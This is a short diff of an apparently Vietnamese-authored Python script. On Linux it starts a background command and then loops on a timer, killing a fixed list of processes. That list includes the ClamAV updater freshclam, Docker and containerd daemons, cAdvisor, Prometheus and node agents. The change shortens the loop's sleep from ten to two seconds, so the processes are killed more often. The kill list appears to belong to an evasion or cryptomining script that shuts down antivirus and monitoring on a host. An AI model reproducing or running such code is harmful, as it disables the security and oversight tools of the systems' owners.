@@ -214,8 +214,8 @@ if operate_system == 'lin':
             else:
                 os.system ('%s &' %command)
         
-        for i in range(0, thoi_gian_nghi, 10):
-            time.sleep(10)
+        for i in range(0, thoi_gian_nghi, 2):
+            time.sleep(2)
             print('Thoi gian con la la ' + str(thoi_gian_nghi - i))
             array_kill = ['freshclam', 'dockerd', 'containerd', 'mdsdmgr', 'node_controller', 'cadvisor', 'prometheus', 'node_agent', 'tail']
             for n in array_kill:
